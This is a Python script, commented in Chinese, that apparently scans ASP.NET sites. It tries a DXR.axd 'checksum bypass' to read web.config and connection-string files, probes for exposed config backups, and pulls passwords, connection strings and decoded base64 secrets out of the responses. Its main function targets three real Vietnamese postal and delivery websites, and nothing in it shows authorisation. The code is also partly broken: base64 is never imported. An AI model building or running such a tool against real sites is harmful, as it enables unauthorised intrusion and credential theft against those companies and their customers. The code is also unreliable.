"""
简化的ASP.NET端点分析工具
专注于DXR.axd和Burp Suite利用思路
"""

import asyncio
import aiohttp
import re
import json
from typing import List, Dict, Any
import logging
from aiohttp import ClientTimeout

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class SimpleASPNETAnalyzer:
    def __init__(self):
        self.session = None

    async def __aenter__(self):
        timeout = ClientTimeout(total=30)
        self.session = aiohttp.ClientSession(timeout=timeout)
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        await self.session.close()

    async def analyze_target(self, target_url: str) -> Dict[str, Any]:
        """分析单个目标"""
        results = {
            "target": target_url,
            "dxr_vulnerable": False,
            "dxr_url": None,
            "bypass_success": False,
            "config_files": [],
            "apis_found": [],
            "secrets": [],
            "recommendations": []
        }

        try:
            # 测试DXR.axd
            dxr_result = await self._test_dxr(target_url)
            if dxr_result:
                results["dxr_vulnerable"] = True
                results["dxr_url"] = dxr_result["url"]
                results["bypass_success"] = dxr_result["bypass_success"]
                results["secrets"].extend(dxr_result.get("secrets", []))
                results["apis_found"].extend(dxr_result.get("apis", []))

                if dxr_result["bypass_success"]:
                    results["recommendations"].append("[CRITICAL] DXR.axd校验和绕过成功，可读取任意文件!")
                    results["recommendations"].append(f"[CRITICAL] 利用方法: {dxr_result['bypass_url']}")

            # 测试配置文件
            config_results = await self._test_config_files(target_url)
            results["config_files"].extend(config_results)

            if config_results:
                results["recommendations"].append("[HIGH] 发现可访问的配置文件")
                results["recommendations"].append(f"[HIGH] 配置文件: {', '.join(config_results)}")

            # 分析页面内容
            page_analysis = await self._analyze_page_content(target_url)
            results["apis_found"].extend(page_analysis.get("apis", []))
            results["secrets"].extend(page_analysis.get("secrets", []))

            if page_analysis.get("apis"):
                results["recommendations"].append("[MEDIUM] 发现API端点，需要进一步测试")

        except Exception as e:
            logger.error(f"分析 {target_url} 失败: {e}")

        return results

    async def _test_dxr(self, target_url: str) -> Dict[str, Any]:
        """测试DXR.axd端点"""
        dxr_url = f"{target_url.rstrip('/')}/DXR.axd"

        try:
            async with self.session.get(dxr_url) as response:
                if response.status == 200:
                    content = await response.text()

                    # 检查是否是DXR内容
                    if "typeof DXR" in content or "dxr" in content.lower():
                        # 尝试校验和绕过
                        bypass_result = await self._test_dxr_bypass(dxr_url, content)

                        return {
                            "url": dxr_url,
                            "bypass_success": bypass_result["success"],
                            "bypass_url": bypass_result["url"],
                            "secrets": bypass_result.get("secrets", []),
                            "apis": bypass_result.get("apis", [])
                        }
        except Exception as e:
            logger.debug(f"DXR测试失败: {e}")

        return None

    async def _test_dxr_bypass(self, dxr_url: str, original_content: str) -> Dict[str, Any]:
        """测试DXR校验和绕过"""
        bypass_attempts = [
            f"{dxr_url}?r=web.config",
            f"{dxr_url}?r=connectionStrings.config",
            f"{dxr_url}?r=app.config",
            f"{dxr_url}?r=1_0",  # 简化版本
            f"{dxr_url}?r=1_0,POYgv"  # 爆破版本
        ]

        for attempt in bypass_attempts:
            try:
                async with self.session.get(attempt) as response:
                    if response.status == 200:
                        content = await response.text()

                        # 检查是否绕过成功
                        if "typeof DXR" not in content and len(content) > 50:
                            # 分析返回的内容
                            secrets = []
                            apis = []

                            # 检查配置文件内容
                            if "<configuration>" in content:
                                secrets.extend(self._extract_secrets_from_config(content))
                            else:
                                # 可能是API或其他内容
                                apis.extend(self._extract_apis_from_content(content))

                            return {
                                "success": True,
                                "url": attempt,
                                "secrets": secrets,
                                "apis": apis
                            }
            except Exception as e:
                logger.debug(f"绕过测试失败: {attempt} - {e}")

        # 如果无法绕过，分析原始JS内容
        return {
            "success": False,
            "url": None,
            "secrets": self._extract_secrets_from_js(original_content),
            "apis": self._extract_apis_from_js(original_content)
        }

    def _extract_secrets_from_config(self, content: str) -> List[str]:
        """从配置中提取敏感信息"""
        secrets = []

        # 连接字符串
        connection_pattern = r'connectionString\s*=\s*["\']([^"\']+)["\']'
        matches = re.findall(connection_pattern, content, re.IGNORECASE)
        secrets.extend(matches)

        # 密码
        password_pattern = r'password\s*=\s*["\']([^"\']+)["\']'
        matches = re.findall(password_pattern, content, re.IGNORECASE)
        secrets.extend(matches)

        return secrets

    def _extract_apis_from_content(self, content: str) -> List[str]:
        """从内容中提取API端点"""
        apis = []

        # API模式
        api_patterns = [
            r'/api/[\w/]+',
            r'/[\w]+\.asmx',
            r'/[\w]+\.ashx'
        ]

        for pattern in api_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            apis.extend(matches)

        return apis

    def _extract_secrets_from_js(self, content: str) -> List[str]:
        """从JS中提取敏感信息"""
        secrets = []

        # 基础64编码内容
        base64_pattern = r'[A-Za-z0-9+/]{20,}[=]{0,2}'
        base64_matches = re.findall(base64_pattern, content)

        for match in base64_matches:
            try:
                decoded = self._try_decode_base64(match)
                if len(decoded) > 10 and any(char in decoded for char in '@:/'):
                    secrets.append(f"Base64: {decoded[:50]}...")
            except:
                pass

        return secrets

    def _extract_apis_from_js(self, content: str) -> List[str]:
        """从JS中提取API端点"""
        return self._extract_apis_from_content(content)

    def _try_decode_base64(self, encoded: str) -> str:
        """尝试Base64解码"""
        try:
            return base64.b64decode(encoded).decode('utf-8')
        except:
            return encoded

    async def _test_config_files(self, target_url: str) -> List[str]:
        """测试配置文件访问"""
        config_files = [
            "web.config",
            "web.config.bak",
            "web.config.old",
            "app.config",
            "connectionStrings.config"
        ]

        found_configs = []

        for config_file in config_files:
            config_url = f"{target_url.rstrip('/')}/{config_file}"
            try:
                async with self.session.get(config_url) as response:
                    if response.status == 200:
                        content = await response.text()
                        if "<configuration>" in content:
                            found_configs.append(config_file)
            except Exception as e:
                logger.debug(f"配置文件测试失败: {config_file} - {e}")

        return found_configs

    async def _analyze_page_content(self, target_url: str) -> Dict[str, Any]:
        """分析页面内容"""
        try:
            async with self.session.get(target_url) as response:
                if response.status == 200:
                    content = await response.text()

                    return {
                        "apis": self._extract_apis_from_content(content),
                        "secrets": self._extract_secrets_from_js(content)
                    }
        except Exception as e:
            logger.error(f"页面分析失败: {e}")

        return {}

async def main():
    """主函数"""
    test_targets = [
        "https://viettelpost.com.vn/",
        "https://vnpost.vn/",
        "https://giaohangnhanh.vn/"
    ]

    async with SimpleASPNETAnalyzer() as analyzer:
        all_results = []

        for target in test_targets:
            print(f"分析目标: {target}")
            result = await analyzer.analyze_target(target)
            all_results.append(result)

            if result["dxr_vulnerable"]:
                print(f"  [VULNERABLE] DXR.axd 发现")
                if result["bypass_success"]:
                    print(f"  [CRITICAL] 校验和绕过成功!")
                    print(f"  [PAYLOAD] {result['recommendations'][2]}")
            if result["config_files"]:
                print(f"  [HIGH] 配置文件: {', '.join(result['config_files'])}")
            if result["apis_found"]:
                print(f"  [MEDIUM] API端点: {len(result['apis_found'])} 个")
            print()

        # 生成报告
        print("=== BURP SUITE 风格报告 ===")
        for result in all_results:
            print(f"目标: {result['target']}")
            if result["recommendations"]:
                print("建议:")
                for rec in result["recommendations"]:
                    print(f"  - {rec}")
            print()

if __name__ == "__main__":
    asyncio.run(main())